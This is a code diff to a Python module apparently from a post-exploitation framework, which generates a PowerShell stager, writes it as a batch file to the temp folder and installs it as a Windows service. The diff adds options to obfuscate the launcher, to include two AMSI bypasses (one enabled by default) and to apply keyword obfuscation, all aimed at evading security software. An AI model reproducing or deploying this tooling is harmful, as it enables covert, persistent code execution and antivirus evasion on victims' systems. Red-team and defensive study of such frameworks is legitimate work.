@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -60,6 +63,26 @@ class Module(object):
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -116,12 +139,16 @@ class Module(object):
         l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
         l.options['Proxy']['Value'] = self.options['Proxy']['Value']
         l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
+        l.options['ObfuscateCommand']['Value'] = self.options['ObfuscateCommand']['Value']
+        l.options['Obfuscate']['Value']  = self.options['Obfuscate']['Value']
+        l.options['AMSIBypass']['Value'] = self.options['AMSIBypass']['Value']
+        l.options['AMSIBypass2']['Value'] = self.options['AMSIBypass2']['Value']
         if self.options['Delete']['Value'].lower() == "true":
             l.options['Delete']['Value'] = "True"
         else:
             l.options['Delete']['Value'] = "False"
-        launcherCode = l.generate()
 
+        launcherCode = l.generate()
 
         # PowerShell code to write the launcher.bat out
         scriptEnd = ";$tempLoc = \"$env:temp\\debug.bat\""
@@ -134,7 +161,10 @@ class Module(object):
             return ""
         else:
             scriptEnd += "\nInstall-ServiceBinary -ServiceName \""+str(serviceName)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""    
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
